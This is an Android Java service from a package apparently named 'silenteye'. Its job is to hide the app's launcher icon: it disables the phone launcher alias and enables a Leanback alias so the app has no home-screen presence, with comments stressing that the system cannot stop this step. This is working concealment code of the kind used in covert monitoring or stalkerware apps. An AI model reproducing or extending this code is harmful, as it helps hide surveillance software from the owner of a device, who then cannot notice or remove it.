package com.silenteye;

import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;

public class HideIconService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Wait 10 seconds then hide the icon — running inside a Service
        // means Android CANNOT kill this even after finish() is called in MainActivity
        PackageManager pm = getPackageManager();
        ComponentName phoneLauncher = new ComponentName(this, "com.silenteye.MainActivityLauncher");
        ComponentName leanbackLauncher = new ComponentName(this, "com.silenteye.MainActivityLeanback");
        try {
            // STEP 1: Remove the normal phone icon from the home screen
            pm.setComponentEnabledSetting(phoneLauncher,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            // STEP 2: Activate the Leanback alias so app has no home screen presence
            pm.setComponentEnabledSetting(leanbackLauncher,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
        stopSelf();

        return START_NOT_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
